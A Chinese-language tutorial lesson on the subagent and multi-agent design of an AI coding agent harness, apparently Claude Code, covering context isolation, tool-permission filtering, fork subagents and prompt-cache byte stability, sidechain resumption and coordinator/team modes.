| **用户的话一个字都不能丢** | 摘要第 6 章"列出所有用户消息" |
| **防任务漂移靠原文引用** | 摘要第 9 章要求 verbatim quote |
| **多视图用标记+投影** | compact boundary、CONTEXT_COLLAPSE 的 read-time projection |
| **改写必须字节稳定** | `contentReplacementState` 幂等；否则 prompt cache 全废 |
| **成本转移到空闲时间** | SessionMemory 后台提炼，压缩时零 LLM |
| **所有自动重试都要熔断** | 连续失败 3 次上限（来自 25 万次/天的浪费事故） |
| **熔断要留人工恢复路** | 留 3k token 让用户能手动 `/compact` |

### 对自研 Harness 的启发

1. **短期记忆 ≈ microcompact**：按"最近 N 个观察 + 时间"裁剪工具结果，不需要调模型。
2. **长期记忆 ≈ SessionMemory**：后台异步提炼，压缩时直接复用，别等到卡住才总结。
3. **摘要模板照抄那 9 章结构**，尤其"列出所有用户消息"和"下一步含原文引用"两条。
4. **给每个自动重试加计数上限**，写进显式 State。

---

# 第 5 课：子 Agent 与多 Agent 协作 —— 上下文隔离的艺术

## 5.1 为什么需要子 Agent

子 Agent 跑在自己的 `query()` 循环里，用自己的消息数组。执行结束后，**只有最后一条 assistant 消息的文本回到主 Agent 的上下文**。子 Agent 烧的 10 万 token 从未进入主 Agent 的消息数组。

> **第 4 课讲的所有压缩手段都是"已经脏了再清理"，而子 Agent 是"从源头不让它脏"。探索性工作（搜索、调研、验证）天然产生大量低价值中间过程，把它们隔离在子进程里，主线程只收结论。**

## 5.2 AgentTool：四条执行路径

`src/tools/AgentTool/AgentTool.tsx` 的输入 schema（真实字段）：

```python
class AgentInput(BaseModel):
    description: str          # 3-5 词的任务描述，用于 UI 展示
    prompt: str               # 给子 Agent 的完整任务指令
    subagent_type: str | None = None   # 用哪种 agent
    model: str | None = None           # 覆盖模型（如用便宜模型做搜索）
    run_in_background: bool = False    # 后台运行（不阻塞主 Agent）
    name: str | None = None            # teammate 名字（团队模式）
    team_name: str | None = None       # 团队名
    mode: str | None = None            # 权限模式覆盖
    isolation: str | None = None       # 'worktree' → 独立 git worktree
    cwd: str | None = None             # 工作目录覆盖

async def call(self, args, context) -> ToolResult:
    # ① teammate 路径：team_name + name → 常驻队友（进程内，可持续对话）
    if args.team_name and args.name:
        return await spawn_teammate(args, context)

    # ② fork 路径：fork 特性开启且没指定 subagent_type
    #    → 继承父 Agent 的【完整对话历史】
    if is_fork_subagent_enabled() and not args.subagent_type:
        agent_def = FORK_AGENT              # 合成的 agent 定义
    else:
        agent_def = resolve_agent_definition(args.subagent_type)

    await check_required_mcp_servers(agent_def)

    # ③/④ 同步 vs 异步（后台）
    should_run_async = (args.run_in_background or agent_def.background
                        or is_coordinator_mode() or is_fork_enabled())
    if should_run_async:
        task = register_async_agent(agent_def, context)   # 注册进 AppState.tasks
        return await run_async_agent_lifecycle(task)      # 立即返回，后台跑
    return await run_agent(agent_def, args.prompt, context)  # 阻塞等结果
```

## 5.3 上下文隔离的核心：`createSubagentContext`

`src/utils/forkedAgent.ts` L345 是本课最值得逐行读的函数：

```python
def create_subagent_context(parent: ToolUseContext, overrides=None) -> ToolUseContext:
    """构造子 Agent 的运行环境。四类处理：克隆 / 共享 / no-op / undefined。"""

    # 中断信号：默认创建【子 controller】（父断则子断，子断不影响父）
    abort = overrides.abort_controller or (
        parent.abort_controller if overrides.share_abort_controller
        else create_child_abort_controller(parent.abort_controller))

    return ToolUseContext(
        # ════ 第 1 类：克隆（隔离但继承起点）════
        read_file_state=clone_file_state_cache(parent.read_file_state),
        #   ↑ 克隆而非共享：子 Agent 读过的文件不污染父的读后写状态。
        #     但继承父的已读记录 —— 父读过的文件，子可以直接 Edit

        content_replacement_state=clone(parent.content_replacement_state),
        #   ↑ 注释解释得极清楚：cache-sharing fork 会处理父消息里的父 tool_use_id。
        #     全新 state 会认为它们"没见过"→ 做出不同的替换决策 → 字节前缀不同
        #     → 缓存未命中。克隆 → 决策一致 → 缓存命中。

        # ════ 第 2 类：全新空集合（per-subagent 独立追踪）════
        nested_memory_attachment_triggers=set(),
        loaded_nested_memory_paths=set(),
        dynamic_skill_dir_triggers=set(),
        discovered_skill_names=set(),
        tool_decisions=None,                  # 每个 agent 重新做权限决策

        # ════ 第 3 类：no-op（禁止子 Agent 污染父状态）════
        set_app_state=(parent.set_app_state if overrides.share_set_app_state
                       else lambda f: None),
        #   ↑ 异步子 Agent 的 setAppState 是空函数！
        #     因为多个并发子 Agent 会互相覆盖状态（React state 竞态）

        set_app_state_for_tasks=parent.set_app_state_for_tasks or parent.set_app_state,
        #   ↑ 但这个【必须】到达根 store。注释给了后果：
        #     "否则异步 agent 的后台 bash 任务永远不被注册、永远不被 kill
        #      （PPID=1 僵尸进程）"
        #     ★ 本函数最精妙的一处：状态更新分两类——
        #       「UI 展示类」可以 no-op，「资源生命周期类」必须穿透到根。

        local_denial_tracking=create_denial_tracking_state(),
        #   ↑ 第 3 课的拒绝计数器。因为 setAppState 是 no-op，
        #     计数器存不进全局 state → 给子 Agent 一个本地副本

        set_in_progress_tool_use_ids=lambda f: None,
        update_file_history_state=lambda f: None,

        update_attribution_state=parent.update_attribution_state,
        #   ↑ 例外：这个始终共享。注释："Attribution 是作用域化的函数式更新
        #     (prev => next)，即使 setAppState 被 stub 也安全 —— 并发调用
        #     通过 React 的状态队列组合。" ← 函数式更新天然可并发合成

        # ════ 第 4 类：undefined（子 Agent 无权碰父 UI）════
        add_notification=None, set_tool_jsx=None, set_stream_mode=None,
        set_sdk_status=None, open_message_selector=None,

        # ════ 身份与追踪 ════
        agent_id=overrides.agent_id or create_agent_id(),   # 每个子 Agent 独立 ID
        query_tracking={"chain_id": uuid4(),
                        "depth": (parent.query_tracking.depth or -1) + 1},
        options=overrides.options or parent.options,
        messages=overrides.messages or parent.messages,
    )
```

### 共享策略判断表

| 状态类型 | 处理 | 理由 |
|---------|------|------|
| 文件读取缓存 | **克隆** | 隔离污染，但继承父的已读记录 |
| 内容替换决策 | **克隆** | 保证 prompt cache 命中（决策必须一致）|
| 技能/记忆触发记录 | **新建空集** | 每个 Agent 独立追踪 |
| UI 状态更新 | **no-op** | 并发子 Agent 会互相覆盖 |
| **任务/资源注册** | **必须穿透到根** | 否则后台进程泄漏成僵尸 |
| 函数式作用域更新 | **共享** | `prev => next` 天然可并发合成 |
| UI 回调 | **undefined** | 子 Agent 不能控制父界面 |
| 中断信号 | **子 controller** | 父断则子断，子断不影响父 |

> **可迁移准则**：设计任何"隔离执行环境"时，逐个问每个共享资源——*"两个并发实例同时改它会怎样？"* 和 *"实例崩了它不被清理会怎样？"* 前者决定要不要 no-op，后者决定要不要强制穿透。

## 5.4 Agent 定义：markdown + frontmatter

用户可以在 `.claude/agents/*.md` 里自定义 Agent：

```markdown
---
name: code-searcher
description: 搜索和分析代码库，不做修改
tools: [Read, Grep, Glob]        # 白名单；'*' 表示全部
disallowedTools: [Bash]          # 黑名单
model: haiku                      # 便宜模型做搜索
permissionMode: plan              # 只读模式
maxTurns: 50
---

你是一个代码搜索专家……（这段就是子 Agent 的系统提示词）
```

```python
@dataclass
class BaseAgentDefinition:
    agent_type: str
    when_to_use: str                 # ★ 给主 Agent 看的"何时该派我"
    tools: list[str]                 # 白名单，'*' = 全部
    disallowed_tools: list[str]      # 黑名单
    skills: list[str]
    mcp_servers: list[str]
    required_mcp_servers: list[str]  # 缺了就不启动
    model: str | None                # 可用便宜模型
    permission_mode: str | None      # 可强制 plan 模式
    max_turns: int | None            # 防跑飞
    background: bool                 # 默认后台运行
    isolation: str | None            # worktree 隔离
    omit_claude_md: bool             # 不注入 CLAUDE.md（省 token）

# 三种来源：built-in / custom（markdown）/ plugin
```

**`whenToUse` 是关键设计**：主 Agent 看到的 AgentTool 描述里会列出所有可用 agent 类型及其 `whenToUse`，模型靠它决定派谁。**Agent 的"自我介绍"是给另一个 Agent 看的**——这是多 Agent 系统的接口文档。

## 5.5 工具分发：两级过滤

```python
def filter_tools_for_agent(tools, is_built_in, is_async, permission_mode) -> list:
    """第一级：系统硬性限制"""
    return [t for t in tools if
        is_mcp_tool(t)                                    # MCP 工具始终允许
        or (t.name == "ExitPlanMode" and permission_mode == "plan")
        or (t.name not in ALL_AGENT_DISALLOWED_TOOLS
            and not (not is_built_in and t.name in CUSTOM_AGENT_DISALLOWED_TOOLS)
            and not (is_async and t.name not in ASYNC_AGENT_ALLOWED_TOOLS))
    ]        # ↑ 异步 agent 用【白名单】，同步用黑名单 —— 后台无人盯着，更严

def resolve_agent_tools(agent_def, available_tools, is_async) -> list:
    """第二级：agent 定义自己的 tools/disallowedTools"""
    pool = filter_tools_for_agent(available_tools, ...)
    if agent_def.disallowed_tools:
        pool = [t for t in pool if t.name not in agent_def.disallowed_tools]
    if agent_def.tools and agent_def.tools != ['*']:
        pool = [t for t in pool if t.name in agent_def.tools]
    return pool
```

**异步 Agent 用白名单而同步用黑名单**：后台 Agent 没人实时盯着，权限对话框也弹不出来（第 3 课的 `shouldAvoidPermissionPrompts`）。**监督强度决定权限模型的严格程度。**

**能否无限嵌套？** 不能。`queryTracking.depth` 递增追踪；`ASYNC_AGENT_ALLOWED_TOOLS` 默认不含 `AgentTool`，后台 Agent 派不出新 Agent。**防止 Agent 爆炸式繁殖。**

## 5.6 fork 子 Agent：共享上下文的特殊物种

普通子 Agent 是"白纸 + 任务指令"。**fork 子 Agent 是"父 Agent 的克隆体"**——继承完整对话历史和系统提示词，**而且共享 prompt cache**。

```python
def build_forked_messages(parent_messages, child_directive) -> list:
    """难点：父 Agent 的最后一条 assistant 消息里有 N 个 tool_use 块
    （就是这 N 个 fork 调用本身）。API 要求每个 tool_use 必须有配对的
    tool_result（第 2 课的坑）。但此刻其他兄弟还没跑完，哪来的结果？

    解法：给所有 tool_use 填【完全相同的占位符】结果。
    ← 所有 fork children 看到的前缀因此【字节完全一致】→ 命中同一份缓存。
      每个孩子的差异只在最后追加的 per-child directive。
    """
    messages = [*parent_messages]        # 全部保留，包括所有 tool_use 块
    messages.append(user_message([
        tool_result(id=tu.id, content=FORK_PLACEHOLDER)   # 同一个字符串！
        for tu in tool_use_blocks(parent_messages[-1])
    ]))
    messages.append(user_message(child_directive))         # 唯一的差异点
    return messages
```

三个配套约束：

```python
# 1) useExactTools=True —— 工具定义一个字节都不能变
#    fork child 继承父的【完整工具集】，即使它只需要 Read。
#    宁可多带工具定义（浪费一点 token），也要保住缓存命中（省几万 token）。

# 2) renderedSystemPrompt 冻结（Tool.ts L293-299 注释）
#    "父 Agent 渲染好的系统提示词字节，在轮次开始时冻结。
#     在 fork spawn 时重新调 getSystemPrompt() 可能产生差异
#     （GrowthBook 冷启动→热启动）从而击穿缓存。"
#    ★ 一个特性开关的缓存状态变化就能让系统提示词多一个字符 → 缓存全失效。

# 3) 防递归 fork：检测对话里是否已有 FORK_BOILERPLATE_TAG
FORK_MAX_TURNS = 200
```

> **当你的系统依赖 prompt cache，"字节级确定性"就会成为一条贯穿全局的架构约束**——它会影响状态克隆策略、工具集组装、系统提示词渲染时机。

同样的 fork 机制还被复用在两处：第 4 课的 **autocompact 摘要生成**和 **AgentSummary 进度摘要**（每 30 秒 fork 一次生成 1-2 句进度）。

## 5.7 结果回传：主 Agent 只拿一份结论

```python
def finalize_agent_tool(agent_result) -> dict:
    return {
        "agentId": ..., "agentType": ...,
        "content": last_assistant_text(agent_result.messages),  # ★ 只有最后一段文本
        "totalToolUseCount": ..., "totalDurationMs": ...,
        "totalTokens": ..., "usage": ...,
    }
    # 完整 transcript 【不】回传 —— 它落盘到 sidechain，主上下文看不到
```

**子 Agent 的 prompt 必须明确要求它"最后输出一份完整结论"**，因为中间过程全部丢弃。这是使用子 Agent 最常见的踩坑点。

后台 Agent 完成时以 **user 角色消息**注入一段 `<task-notification>` XML。协调器提示词专门警告模型：这些看起来像用户消息但不是，靠开标签区分，永远不要感谢或回应它们。

> **多 Agent 系统的工程难题：Agent 间通信必须复用 user/assistant 两种角色，于是需要带内标记（in-band signaling）来区分"真人说的"和"其他 Agent 说的"，并在提示词里明确教会模型区分。**

## 5.8 Sidechain：可寻址、可恢复的 Agent

```
~/.config/claude/projects/{project_id}/{session_id}/subagents/agent-{agentId}.jsonl
```

叫 sidechain 是因为消息带 `isSidechain=true` 标记，通过 `parentUuid` 链接成**主链之外的旁链**。

```python
async def resume_agent_background(task_id):
    """后台 Agent 停了（用户 kill / 进程重启），怎么接着跑？"""
    transcript, replacements = load_from_sidechain(task_id)
    # ★ 重建 contentReplacementState —— 保证同样的工具结果被同样地替换，
    #   否则 prompt cache 前缀变了（又是它！）
    state = reconstruct_for_subagent_resume(replacements)
    verify_worktree_exists(task.worktree)
    agent_def = resolve_agent_definition(task.meta.agent_type)
    return await run_agent(agent_def, messages=transcript,
                           content_replacement_state=state)
```

## 5.9 多 Agent 协作的三种形态

### ① Coordinator 模式（`src/coordinator/coordinatorMode.ts`）

环境变量 `CLAUDE_CODE_COORDINATOR_MODE` 开启。主 Agent 变成**纯编排者**，系统提示词被整体替换，核心要求可以概括为：

- 你的角色是 coordinator：让 worker 去研究/实现/验证，你负责综合结果并与用户沟通
- 能自己直接回答的问题就别派活
- **不要用一个 worker 去检查另一个 worker**——worker 完成会自己通知你
- 不要用 worker 做"读个文件"这种琐事，要给高层任务
- 派完活就简短告知用户然后结束发言，**永远不要编造或预测 worker 的结果**
- 想复用某个 worker 已加载的上下文，就用 `SendMessage` 继续它

Worker 用特殊权限模式 `bubble`——权限请求"冒泡"到父终端让用户批准。

> **这些指令本质上是在教模型做项目管理**，每一条都对应一个真实失效模式。

### ② Team（`TeamCreateTool` + `SendMessageTool`）

创建 team 文件定义成员，每个成员是常驻的 in-process teammate。通信通过 mailbox（进程内）或 UDS socket / bridge（跳进程）。

### ③ Task 列表

**Task 工具管的是"待办清单"（用户可见的 todo），AgentTool 管的是"执行单元"**。

```python
async def send_message(to, message):
    """一个 'to' 地址，四种投递方式 —— 调用方不需要知道对方在哪。"""
    if is_in_process_teammate(to):     return queue_to_mailbox(to, message)
    if task_status(to) == "running":   return queue_pending_message(to, message)
    if task_status(to) == "stopped":   await resume_agent_background(to)   # 自动唤醒
                                      return queue_pending_message(to, message)
    if is_team_broadcast(to):          return broadcast_to_team_members(message)
    return send_via_uds_or_bridge(to, message)      # 跳进程
```

## 5.10 第 5 课小结

### 四种子 Agent 形态对比

| 形态 | 上下文 | 结果 | 典型用途 |
|------|--------|------|---------|
| **同步子 Agent** | 白纸 + 任务指令 | 阻塞等待，拿最后文本 | 一次性调研/搜索 |
| **异步子 Agent** | 白纸 + 任务指令 | `<task-notification>` 通知 | 长耗时任务、并行 |
| **fork 子 Agent** | **继承父完整历史** | 同上 | 已有上下文的并行分支、生成摘要 |
| **teammate** | 独立且**常驻** | 双向消息 | 多角色协作、持续对话 |

### 八条可迁移的设计原则

| 原则 | 体现 |
|------|------|
| **隔离优于清理** | 探索性工作放子 Agent，从源头不污染主上下文 |
| **只回传结论** | 只取最后一条 assistant 文本；prompt 必须要求"输出完整结论" |
| **逐资源判断共享策略** | 克隆/新建/no-op/undefined/穿透，五种处理各有理由 |
| **UI 状态可 no-op，资源生命周期必须穿透** | `setAppState` no-op 但 `setAppStateForTasks` 到根 |
| **监督强度决定权限严格度** | 异步 Agent 用工具白名单，同步用黑名单 |
| **禁止无限繁殖** | depth 追踪 + 后台 Agent 不给 AgentTool + 防递归 fork |
| **依赖缓存 = 字节级确定性成为架构约束** | 冻结系统提示词、相同占位符、useExactTools |
| **Agent 要可寻址、可持久化** | sidechain + resume + 统一 `to` 地址路由 |

---

*（第 6 课待续）*
